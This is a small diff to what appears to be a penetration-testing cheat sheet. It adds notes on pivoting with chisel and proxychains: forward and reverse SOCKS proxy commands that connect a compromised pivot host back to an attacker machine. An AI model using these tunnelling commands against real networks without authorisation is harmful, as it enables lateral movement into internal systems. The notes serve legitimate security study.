@@ -326,13 +326,14 @@ socks4 	127.0.0.1 9050
     - chisel server -v -p 1234 --socks5
   - Start client on attacker Connect pivot to Attacker
     - chisel client -v PIVOT:1234 socks
-  - Adjust proxychains config to tun port
-  - 
+  - Adjust **proxychains** config to tun port
+   - config socks5 127.0.0.1 1080
 
 - Reverse SOCKS Proxy
   - server: chisel server -p [port] --reverse &
   - client (pivot): ./chisel client [attacker]:8005 R:socks &
     - R = remote, client knows that server antecipate proxy
+
 
 - Forward SOCK Proxy
   - Pivot: ./chisel server -p LISTEN_PORT --socks5
